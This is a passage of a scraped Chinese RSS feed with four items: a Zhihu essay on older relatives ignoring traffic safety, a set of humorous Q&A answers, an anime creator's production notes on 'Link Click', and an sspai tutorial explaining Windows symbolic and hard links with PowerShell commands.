alt=\"\"></figure><p>老一辈的人，包括我的父辈们，<strong>对于身后的汽车，总是“嗤之以鼻”，不闻不问。</strong></p>\n<p>我问我的父亲，在你骑自行车，或者走路的时候，为什么总是不让后面的汽车，万一把你撞了怎么办？父亲的回答让我哭笑不得，他似乎对于交通法规，非常懂行。<strong>“汽车会让我的，就算是撞了我，也算他倒霉”。</strong>这种想法在他脑海里根深蒂固，不管我用什么安全问题，还是不划算之类告诫，即便他在口头上半搭不理般应付答应，实际依然我行我素。</p>\n<p>而早先，我们知道机动车撞了人，很大概率上是机动车责任。<strong>弱势行人保护让行人开始“横行霸道”，不管是走乡间小路，还是宽阔马路，很多行人都是“我是老大，你得让我”的错觉。久而久之，这些人把这当做是“挡箭牌”。</strong>丝毫不顾万一汽车驾驶员“分心了”或者“疲劳了”的状态。</p>\n<p><strong>我多次劝告父亲和爷爷他们，汽车撞了人，有保险，可以修；而人被撞了，出了问题，后悔也来不及</strong>。然而，这种劝告仍然无济于事。</p>\n<p>上初中的时候，思想政治老师曾经给我们说了一个比较之不合情理的规定。<strong>但凡机动车撞到自行车或者电动车，都要负责。概括为“轮子多的车撞了轮子少的车，由轮子多的车负责”</strong>。当然，后来我知道这一条并不完全准确。</p>\n<p>也是因为这一条，父亲最早是骑自行车，几乎没有让过后方来车。哪怕后方车辆的闪光灯再闪，喇叭再响，他也不为所动。后来，自行车换了摩托车，仍然开在路中央，唯我独大的霸道气势。假使对向车道远光狗不换近光，父亲也会指指点点，破口大骂，甚至于把车头偏向对向来车，制造“快撞上来”的假象。通常这种伎俩很有效，来车都会乖乖关闭远光切换成近光。为什么知道他这些行为，因为有一次我搭恰巧放学回家晚了，乘了他这一班车，着实捏了一把汗，敢怒不敢言。</p>\n<p>爷爷的故事就更加离奇精彩，他不会骑自行车，但是会蹬三轮。三轮车的速度，比起自行车是更慢了。零几年的时候，爷爷和奶奶买了一辆三轮车，到隔壁镇上做“甜白酒”的买卖，每天起早摸黑，做酒酿和卖酒酿。一碗甜白酒当天发酵，第二天乘着酒酿还是甜的，放到冰箱冰镇后，一块钱一碗，玻璃柜里随便你挑。挑完当下吃完，还小工碗，走人。犹记得这是我吃过最好吃的酒酿，甚至有一次喝上了头，喝晕喝睡着了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-71764f26c2cd1282cbe5a808c876835c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>而他们的助力工具，就是小三轮。两个人一人蹬，一人叫卖。遇到有大车后面“嘀嘀嘀”按喇叭，爷爷不紧不慢，晃悠悠骑他的车，直到后面的车找到机会，一晃而过。当然，有时候他是听不到的，比起拖拉机的巨响，小汽车的声音几乎不算什么。再者，他的小三轮，加上奶奶，再加上一车甜白酒，让本身就不快的小三轮，更加笨重了。</p>\n<p>当然，他没有选择让。因为他也相信，大车会让他，撞了大车负责。这两条深入脑海，毫不动摇。即便后面坐了人，无论是他老婆，还是他孙子，照旧。</p>\n<p>而再后来人力三轮，换成了电动三轮。爷爷似乎对三轮车的钟爱，有增无减，无法自拔。每年他都要把自己的电动三轮捣鼓一番，要么是到三轮车铺子去换个电瓶，要么就是直接换个新车。大家对爷爷的“钟爱”有些不解，认为他把金钱过度浪费在了“行”上。于是劝解他，免费的公交你可以乘，从家门口到市区，一分钱不用花。爷爷的解释也差强人意，自己开车方便，自由。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-35bf2d98516c8e06f09db78f44b3be29_720w.jpg?source=8673f162\" alt=\"\"></figure><p>然而，他仍然坚持电动三轮出行。无论是短途村内村外的琐事，或者是去闲逛，还是说去二三十公里外的亲戚朋友家拜访，都是一辆电动三轮车。</p>\n<p>有一次，乡下的亲戚打来电话，悄悄说爷爷去了他们那里玩。去就去了，关键是大老远的骑了电动三轮；骑了就骑了，关键是他半路几乎没有遵守交通规则。为什么知道，因为他告诉亲戚半路上冲到沟里，因为路人帮忙，连人带车才捞了起来。亲戚说完还多说了句，别说我说的，万一他又要发脾气。而为什么冲到沟里，爷爷一言以蔽之“估计有点困”。</p>\n<p>后来，多次劝导，无果。比起父亲，<strong>他既不让身后来车，又不遵守交通规则，同时还容易犯困，耳朵也不是很好</strong>。大家经常和他就骑电动三轮车而争论，一言不合就开吵，大家都被闹得不愉快，但爷爷很执拗，谁都不听。</p>\n<p>相比于爷爷，发生了一件事后，父亲的态度先发生了转变。</p>\n<p>2020 年，乡下的大伯喝完酒，过马路。结果被一辆车给撞了，当时就被送往医院急救。对方车辆赶紧送往医院后抢救，并垫付了一万块。大伯事后回忆，真是在鬼门关走了一遭，只听见有人在喊他，就是睁不开眼，动弹不了。事实也如他所述，他女儿每天在 ICU 探望他的时候，叫喊他，捏他，刺激他醒来。皇天不负有心人，大伯在被医院宣判病危，并让家人准备后事的情况下，居然奇迹般地醒了。</p>\n<p>而后，家人开始与对方撞人的车辆司机理论。当时对方就报了警，交警让先送医，事后调取了监控。大伯和几个酒友，摇摇晃晃地穿过马路，当时正好是红灯。而撞人的面包车，遵守了交通规则，绿灯行，也没有超速，即将撞到大伯时，还特意减了速。最后交警也无可奈何，判了大伯全责。面包车司机并没有把那一万块要回去，说是赔给他看病用的，最后医药费全由大伯承担。</p>\n<p>除了花费了巨额医药费外，在 ICU 的几天，以及医院住院的几天，都是大伯毕生难忘的经历。出院后，讲话仍然不清楚，走路也不利索。期间遭受的痛苦，只有他自己知道。而父亲正是因此发生转变，让他转变的，不仅仅是大伯的痛楚，还有掏出去的十几万元医疗费。<strong>金钱付出和痛苦承受让他明白，不负责的走路，有时也要为此负责。并不是对方车辆能让，出事对方承担的错误思路。</strong></p>\n<p>而爷爷也有过态度转折点，但是他的转折点和父亲又有些不同。前几年，因为要去市里，电动三轮车的续航已经不够开过去了，爷爷隔三差五，就拿着免费公交卡去坐公交。而我们乡下的公交车司机，和老人们几乎都认识，所以有时候比坐在乘客座位的人们，更健谈。</p>\n<p>司机每每遇上行人，自行车，或者开电动的老大爷，他都放慢速度，慢慢等候。既不按喇叭，也不超车。年轻点的人就开始说了“这死老头子，怎么开得车”。</p>\n<p>而司机不紧不慢，开始发表自己的言论。“你也没办法，你说你喇叭响了吧，他要是心脏病发作，你承担得了？你要是超车，他突然给你转弯，撞了碰了你们还走得了？你要是开窗说他两句，老头老太拉拽着要跟你拼命，捞得着什么好处？还不如在后面等等他，后面我开快点就好了，赶得上。”</p>\n<p>司机喝了一口水，继续说道“你们自己开车么也要注意，我们这种人开车，还好会让着一点。你说碰到点年轻人和脾气糙的，早就撒哈着开过去了。你说你不让，人家汽车有保险，把你撞了，走个保险就 OK 了。你还要半身不遂躺床上求人照顾，有个老伴还好点，没有老伴你还指望你子女照顾你？他们出去干活的干活，挣钱的挣钱，他们也有子女，你说你一大把年纪了，干嘛就不好好的。被撞了要点钱？想多了吧，现在保险惊得很，怎么可能给你多算，老老实实在地上蹦蹦跳跳不开心么？安安全全过一辈子不舒服么？”</p>\n<p>司机等了良久，总算把小三轮超过去了，又继续侃“年代变咯，紧跟时代，争做好公民”。以往的“刁民思维”已经没有任何优势了，相反还要吃亏，并且被人指责唾骂。</p>\n<p>也是因为不经意的听人聊天，这比起我们的千劝万阻，效果好太多了。老人们往往别人一两句话，也就信了，我们做小辈的，说死也不管用，有时还要闹不愉快。当然，爷爷估计也是听明白了司机的话，<strong>一是捞不着好，二是要受罪，三是要连累人</strong>。既然百害无一利，身边又不缺这种案例，自然而然，爷爷也收敛了。</p>\n<p>所以一直以来，我的父辈，爷爷辈，包括其他很多其他人，不管年幼，不管老少。很多人没有避让来车的习惯，甚至有一种天真的心理<strong>“我不让车，车就让我”，</strong>殊不知，汽车驾驶员也会有疏忽的时候。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/348195449\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737970"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-07-11 23:06:33","description":"\n<div>\n<h2>你是通过什么事情才知道自己丑的？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-f8d6a1244138e15c4fb5c4fded9b8ab8_l.jpg?source=8673f162\"><span>苍樵</span>\n<a href=\"https://www.zhihu.com/question/313268032/answer/675453861\" hidden>阅读原文</a>\n</div>\n<div>\n<p>当我自嘲时，我的朋友们不是反驳我，而是开始安慰我的时候…</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-a5745450a5b9daf341bbfa66c8e24a6f_720w.jpg?source=8673f162\" data-rawwidth=\"198\" data-rawheight=\"185\" data-size=\"normal\" width=\"198\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/313268032\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>你在闲鱼最亏的一单是什么？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-cf6e42444db71715c748391efc1e7a80_l.jpg?source=8673f162\"><span>强悍果壳，</span><span>广告导演/摄影指导</span>\n<a href=\"https://www.zhihu.com/question/323401575/answer/749817079\" hidden>阅读原文</a>\n</div>\n<div>\n<figure><img src=\"https://pic4.zhimg.com/v2-5687cff711ae08d4197fe9f1bafe0c1d_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/323401575\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>为什么公鸡早上要打鸣？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>时代周刊06年度风云人物，曾获08年感动中国组委会特别大奖。</span>\n<a href=\"https://www.zhihu.com/question/53820569/answer/1234478498\" hidden>阅读原文</a>\n</div>\n<div>\n<figure><img src=\"https://pic2.zhimg.com/v2-cf464f6ef4f1b8c865548925dc90e6f0_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/53820569\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>有没有人装逼正好撞到你擅长的领域上的？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/150ddd024a031fceb66ee06c01811a5c_l.jpg?source=8673f162\"><span>Soulmate，</span><span>苦逼嗑盐狗</span>\n<a href=\"https://www.zhihu.com/question/338688699/answer/912853040\" hidden>阅读原文</a>\n</div>\n<div>\n<p>审论文时候吧 </p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/338688699\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>有没有类似“duck不必”的谐音梗？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/e27e05513_l.jpg?source=8673f162\"><span>刘泽坤，</span><span>1/2电影特效师，1/2电子工程师</span>\n<a href=\"https://www.zhihu.com/question/375425891/answer/1305509361\" hidden>阅读原文</a>\n</div>\n<div>\n<p>知己知彼，百战不 die</p>\n<p>——《孙子·谋攻篇》</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/375425891\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9737979"},{"title":"动画《时光代理人》已经完结，如何评价这部作品？","date":"2021-07-11 11:30:09","description":"\n<p><b>《时光代理人》创作分享</b></p>\n<p>哗——时间奔涌，转瞬即逝。一转眼，《时光代理人》完结撒花。</p>\n<p>其实每个项目都有很多话想跟大家唠唠，之前也立过FLAG说会抽空做分享，今天就趁此良辰吉日说说《时光代理人》的点点滴滴。</p>\n<p><br></p>\n<p>鄙人不才，从2013年创业开始带着团队做过很多作品，但原创内容屈指可数。关于为什么原创做得少，其实在过去的某些采访中也说过，行业发展还是需要有人愿意成为基石，来垫高整个市场。所以，前几年为数不多的原创作品其实都是忙里偷闲的自嗨。《凸变英雄BABA》最早辣眼的海报和清奇的画风就是嗨大了的最好写照。为了能把原创动画踏踏实实地做好，在2018年和B站成立了合资公司哆啦哔梦。</p>\n<p><br></p>\n<p>其实，《时光代理人》的前身是18年国创发布会上发布过的《净化法则》。当时企划的方向就是做一部能让观众打开第一集就放不下的剧集。悬疑题材动画国内很少涉及，我还是不愿放弃，决心继续尝试。当时，正好我也在构思新一季的《凸变英雄》，就萌生了将其中的创意元素和悬疑剧结合的念头。很多网友也从各种渠道扒出了《凸变英雄PHOTO》这份企划。的确，穿越照片这个想法原本就是准备用在《凸变英雄PHOTO》中的。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b870a61cc042443ac036f4de358b2425_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1039\" data-rawheight=\"735\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p>19年年底开始了《时光代理人》的剧本创作，最早的思维源头其实就是单纯的想要回到过去的照片——当时那些灿烂的笑，当时课桌上的涂鸦，如果现在的自己回到那里，那时，感受会是怎样的呢。但作为目标是让人想不停追下去的剧集，适当地设置障碍是必要手段，所以就想到了将一种能力拆成两份的想法——虽然能通过照片回去，但无法知道将会发生什么。知道照片中将会发生的事，但无法进入照片。程小时和陆光，就此诞生。所以，双男主一开始并不是为了商业卖点而故意设计的，只是需要两个能力互补的角色。当然，我也考虑过男女搭配的合作模式，但感觉异性之间的很难彻底将自己的内心交给对方，除非跨越了单纯的友谊。但两个好哥们之间是可以的，所以最终还是决定启用双男主。而乔苓的设计是为了增加女性伙伴特有的视角和行为，比如对程小时姐姐一般亲人的关怀，这种感受和陆光能给予程小时的是完全不同的。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2dd0c3fc4c823025430d777f79ea966a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"641\" data-rawheight=\"849\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p>接着是考虑用主线中穿插单元剧的模式，这套模式在很多剧集里都经常使用。原本《净化法则》的企划初衷是从一开始就直切主线，不给观众喘息的机会。但进入照片这个题材我觉得能发挥的空间太大了，它能承载更多现实主义和人文情怀。所以为了两边平衡，才有了现在主线加单元的经典模式。并且，在想到进入照片这个点子的那一刻，我就想：如果能通过动画回到真实发生过的事件中，去帮助那些曾今在某时某刻，某张照片中留有遗憾的人弥补伤痛，那一刻作为动画作品就有了更非凡的意义。所以，不管剧集中的番外篇还是日常单元的设置都是为了未来能帮助现实中的人们“还愿”而设下的准备。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-aa582f4baed87b53254d3a48c260c23b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1002\" data-rawheight=\"472\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p>在几个单元故事的选题上，基本都有现实中的原型。特别是地震回，虽然自己没有亲身经历过那些灾难，但有一张攀枝花地震时母亲紧紧抱着自己女儿的照片给我带来了巨大的震撼，久久无法忘怀。所以设计陈潇母亲用身体护住陈潇的姿势就是参考了那张照片中母亲的姿势，希望以此向那些伟大的母亲们致敬。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e58ccc9cbfd376ff357287add97efa7c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1039\" data-rawheight=\"585\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>整个第一季的故事其实主要脉络都是围绕着小时的成长，从第一次接触EMMA事件时的冒失鬼，到地震回面对不能改变过去的绝望，他有了第一次对自己该用能力去做什么的真正思考。虽然无法改变过去，但如果回到过去能给现在的人带来帮助，给他们一个更好的未来，那还是值得继续的。所以，他接受了亮哥的委托帮他找回了豆豆。中间他赐给梅姨的那一记“送你上西天”却是纯属意外，因为受到惊吓时做出了条件反射。而因此也误打误撞地让梅姨领教了这个小祖宗的本事，从而对豆豆不敢下黑手。程小时在不经意间还是对过去产生了一些细微的变化，但这些都因为带来的是好结果而被疏忽了。随后他积极地想要协助警方捉拿连环杀人案的凶手也因为拐卖案的成功。而亲临EMMA“被杀”现场成了他第二个成长转折，让他陷入焦虑——改变过去而产生的代价是否能够承受。所以在营救徐姗姗之前，小时进行了一段独处，陆光也很善解人意，给了他充足的时间不去打扰他。当小时完成独立思考后再次说出：“准备出发”时的语气，状态都和第一集时完全不同了，这也证明了他再次成长。所以，最终他向EMMA说的那些话，其实也是他这一季中成长的进化和缩影，正因为他能体验不同的人生，那些人生中最珍贵的东西也都保留了在他的身上和记忆里。当时撰写剧本的时候也希望在最后让小时的人物经历，无论是事件推理，还是人物塑造在第一季中都能完成闭环。</p>\n<p><br></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8883c469722c175a25724a7768b43e52_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1039\" data-rawheight=\"585\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p>当然，第一季的尾声部分也故意和第一集做了呼应，在温暖和感动的情绪还未完全平复之时给大家带来更残酷的一刀。而这一刀也是将主角团的三人同时逼入绝境，所以大家多多点追番随时更新第二季的一手消息哈。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-72b750c046decee620e37135f103cb37_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"913\" data-rawheight=\"677\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p>啰啰嗦嗦和大家絮叨了些《时光代理人》创作过程的来龙去脉，其实能聊得还有很多，如果大家感兴趣可以在留言里发问，之后我再抽时间和大家继续做分享。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/haolin-41?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">haolin</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470959705/answer/1990044038?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">11 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/469574987?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价动画《时光代理人》第十集？</a><br><a href=\"http://www.zhihu.com/question/459378374?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价动画《时光代理人》第四集?</a><br>\n","link":"http://www.zhihu.com/question/470959705/answer/1990044038?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"符号链接、硬链接入门及实例：云盘同步任意位置文件、更省空间增量备份方式……","date":"2021-07-11 03:24:15","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>本文主要介绍 Windows 系统下的符号链接（Symbolic Link）和硬链接（Hard Link）的原理，特性以及它们在日常工作生活中应用。</p>\n<p>这两类链接直接由文件系统实现和支持，各类软件无需适配即可使用。学会使用这两种链接，我们就可以：</p>\n<ul>\n<li>用云盘保存那些不方便改变位置的文件</li>\n<li>使用完全不同的路径编辑同一个文件</li>\n<li>实现更省空间的增量备份</li>\n</ul>\n<h2>初识符号链接与硬链接</h2>\n<p>如果你对这两个名字感到陌生，那么可以打开你的系统盘，在根目录使用 Shift + 右键的方式进入 PowerShell，键入 <code>dir -force</code> 来列出所有的文件和文件夹。其中一定会有名为 <code>Documents and Settings</code> 的文件夹，在名称后面有一个箭头指向了 <code>C:\\Users</code>。该文件夹的作用是：当应用想要访问 <code>C:\\Documents and Settings</code> 这个路径时，系统会自动将它引导到 <code>C:\\Users</code>，应用可以用 Documents and Settings 这个目录名访问 Users 下的任何内容。</p>\n<p>这是微软为了保证 Windows Vista 以前的应用仍然能够正确安装在 Windows 10 上所做的设计，此文件夹正类似<sup class=\"ss-footnote\" href=\"\" title=\"被称为目录链接（Junction），它和符号链接原理和效果都类似，但仅能用于本地卷的目录。本文不做过多介绍。读者可以泛泛地将它理解为符号链接。\" footnote-id=\"1\">1</sup>于符号链接。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/75533f03740ae44ce91aacc92552d0c6\" alt=\"202107090152006\"></figure><p>硬链接就没这么麻烦，因为文件管理器上的几乎所有文件都可以被看作是硬链接。不信的话可以在终端中使用系统内置的硬链接查询命令：<code>fsutil hardlink list [文件路径]</code>。它会列出一个文件对应的所有的硬链接路径，该工具一定会给出的此文件本身的路径。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/e9f853784b04e42f2d09f5e793433d5a\" alt=\"202107090127162\"></figure><p>和这两类链接见了面之后，我们还要重新认识一下「文件」。</p>\n<p>在一台 Windows 电脑中，硬盘被分割为卷用以保存数据，在每一个卷上，数据对象被 NTFS 文件系统赋予了独一无二的<strong>文件 ID</strong> 以及<strong>与之对应的文件路径</strong>，文件路径和文件 ID 对应，文件 ID 和数据对象绑定，最终才呈现为可供用户打开、编辑的文件。</p>\n<p>因此可以说，我们所看到的文件并非数据本身，而是由文件路径指向数据对象的链接。</p>\n<p>本文的主角，符号链接和硬链接正和这种数据的组织方式息息相关。</p>\n<h2>符号链接的原理和特性</h2>\n<p>前面说道，文件是数据对象和文件路径的链接，符号链接则是将自己链接到一个目标文件或目录的路径上。当系统识别到符号链接时，它会跳转到符号链接所指向的目标中去，而不改变此时的文件路径。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/250035488b0e9a44e46f3115295461e0\" alt=\"202107091451\"></figure><p>举例来说，有一个名为 source 的文件夹。在桌面使用管理员权限打开 PowerShell，输入 <code>New-Item Symlink -ItemType SymbolicLink -Target C:\\...\\source</code> 为 source 文件夹创建名为 Symlink 的符号链接。然后打开此新建的文件夹，可以发现虽然路径是 Desktop\\Symlink，但无论是内部的目录结构还是文件内容，都和 source 文件夹一模一样。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/67abff5f10c1673f93927b8873c43bd7\" alt=\"image-20210709150525321\"></figure><p>符号链接像一个虫洞：当用户或应用要访问此虫洞时，就会被传送到符号链接所指向的地方，<strong>但他们是通过虫洞访问此目标的</strong>，所以其路径仍是虫洞自己的路径，这是它和快捷方式在效果上的区别所在。</p>\n<p>更进一步说，符号链接的名称或者后缀丝毫不会影响到其目标。如果有一个图片 cats.jpg，我为它创建一个叫做 cats.docx 的符号链接，双击 cats.docx 时，仍然会出现一个图片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/4294a3a2303768570c51e827c380295a\" alt=\"20210709152355\"></figure><p>符号链接具有下面的特性：</p>\n<ul>\n<li>\n<strong>只需要一个路径。</strong>创建时，它的目标可以是本地的、远程的任何文件或目录，即使目标不存在。</li>\n<li>\n<strong>所做的一切更改都会反映在目标上</strong>。因为打开符号链接，就是打开了目标。复制符号链接，会复制目标的内容；移动符号链接，则会移动链接本身。</li>\n<li>更改目标的名称，移动目标的位置，符号链接将会成为死链，因为它无法通过设定的路径找到目标；更改符号链接本身的名称和位置，目标不受影响。</li>\n<li>当目标被删除时，符号链接继续存在，但会成为死链，无法打开。当符号链接被删除时，它指向的目标不受影响。</li>\n</ul>\n<h2>硬链接的原理和特性</h2>\n<p>硬链接和符号链接的原理完全不同，符号链接是指向目标路径的链接，而硬链接则是指向目标数据对象的链接。因为一个卷中的数据对象都有一个独一无二文件 ID，也可以说硬链接是指向目标文件 ID 的链接。</p>\n<p>不难发现，硬链接和前面对文件的定义是一样的，原因在于，同一个文件 ID 可以对应很多<sup class=\"ss-footnote\" href=\"\" title=\"很多，但小于 1024 个。即最多有 1023 个硬链接指向同一文件 ID。因此，第七节中提到的 DeLorean Copy 一般情况下最多只能有 1023 个备份\" footnote-id=\"2\">2</sup>不同的文件路径。这些不同的文件都可以被称为<sup class=\"ss-footnote\" href=\"\" title=\"理论如此，但为了避免混淆，本文按习惯称文件 ID 只与一个文件路径对应的为文件。仅有多个对应关系的才称之为硬链接。\" footnote-id=\"3\">3</sup>硬链接。这也是为什么在第一节中说「文件管理器上的几乎所有文件都可以被称为硬链接」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/8e2c1ee82f4917a9d07c4d5a7ce9f809\" alt=\"202107091414\"></figure><p>这里之所以引入文件 ID 的概念，是因为通过它我们可以直观看到文件所指的数据是否改变。以桌面上的 Demo.txt 为例，使用 <code>fsutil file queryFileID Demo.txt</code> 可以查看到它对应的文件 ID 为 <code>...3d321</code>。当我们用复制粘贴的方式为此文件创建一个副本 Demo - Copy.txt 时，通过 ID <code>...5d78c</code> 可知我们实际上创建了另一个数据。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/27af80ae83c9a193398b53c83eb9b2d7\" alt=\"image-20210709132624939\"></figure><p>下面，在 PowerShell 中使用 <code>New-Item Hardlink.txt -ItemType HardLink -Target C:\\...\\Demo.txt</code> 给 Demo.txt 创建一个叫做 Hardlink.txt 的硬链接。同样用 <code>fsutil file queryFileID Hardlink.txt</code> 得到 Hardlink.txt 的文件 ID 为 <code>...3d321</code>，这和 Demo.txt 是一样的，说明两者都指向同一个数据对象。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/19ac322d2d570455bea2a8c2227b1dc9\" alt=\"image-20210709133933264\"></figure><p>因为他们数据是相通的，这两个文本所有属性都相同，更改其中一个文件的内容，另一个也会随之变化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/d3da5706dd3e3e084a3c254f6f4cd27e\" alt=\"202107091355\"></figure><p><strong>由于不同的文件指向的是同样的数据，所以无论给同一个文件创建多少个硬链接，他们占整个卷的数据大小都是一样的</strong>。下图中，当 C 盘只有一个大小为 4 G 的 ISO 文件时，剩余大小为 373 GB；我为此 ISO 创建了另外 4 个 硬链接之后，卷的剩余大小并不因此而变化，尽管属性界面显示他们为 20 GB。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/10b1d86df93ce4cf77643dd8aaed92b0\" alt=\"20210709141033\"></figure><p><strong>硬链接可以看作是一个既有文件的别名</strong>，它具有下面的特性：</p>\n<ul>\n<li>创建时，它必须指向本地的同一个卷内存在的文件<sup class=\"ss-footnote\" href=\"\" title=\"系统禁止用户创建目录硬链接。硬链接在指向文件夹会导致一个文件的父目录不唯一，系统在遍历文件夹内容时出现循环……\" footnote-id=\"4\">4</sup>，在 C 盘创建硬链接只能指向 C 盘存在的文件。因为只有在同一个卷内，文件 ID 才是独一无二的，且没人能在这个卷内编辑另一个卷的数据。不存在的文件没有文件 ID。</li>\n<li>打开硬链接，所做的一切更改都会反映在目标文件上。因为目标文件也链接着被更改的数据。</li>\n<li>更改目标文件的名称、位置，硬链接不会受到影响。更改硬链接的名称、位置，目标文件不受影响，链接不会断开。因为改名，移动都不会改变文件 ID。</li>\n<li>当目标被删除时，硬链接继续存在，且可以正常打开、编辑。因为他具备一个完整的文件结构。当硬链接被删除时，目标文件继续存在，不受影响。只有当一个文件 ID 对应的所有硬链接被删除时，数据才真正被标记为删除。</li>\n</ul>\n<h2>使用命令行或 Link Shell Extension 创建两种链接</h2>\n<p>新建符号链接和硬链接不像普通文件那样容易。第二、三节已经展示了使用 PowerShell 命令的方式来创建二者：</p>\n<p><code>New-Item [链接名称] -Itemtype SymbolicLink/HardLink -Target [目标绝对路径]</code></p>\n<p>新建符号链接始终需要管理员权限，<code>-target</code>后面一般说来需要填写绝对路径才能被识别。命令行创建的方式往往在脚本中更方便，对于普通用户而言，则有更简单、可视化的软件供选择。</p>\n<p>Link Shell Extension 就是一个功能十分强大的符号链接、硬链接（以及没提到的目录链接）的新建和管理工具。使用 <code>choco install linkshellextension -y</code> 或者进入软件 <a href=\"https://schinagl.priv.at/nt/hardlinkshellext/hardlinkshellext.html\">官网</a>，下载安装包并打开。安装完成后，我们便能够使用鼠标中键或者右键来简单地创建链接。</p>\n<p>打开文件管理器，选中作为目标的文件或者文件夹，按住鼠标中键，然后将它拖到想要创建链接的目标文件夹处，松开鼠标，就会弹出创建链接的快捷菜单，选择需要的选项即可创建完成。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/7e3befaea5a4013afa951c84f39e466e\" alt=\"20210709162752\"></figure><p>另一种创建的方法是，选中一个文件或目录后，右键，点击 Pick Link Source，将其选择为目标。然后在另一个文件夹的空白处右键，在 Drop as 的子菜单中，选择需要创建的链接类型。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/583c19e9fd2bd6d131b6f80b199d8116\" alt=\"20210709163307\"></figure><p>Link Shell Extension 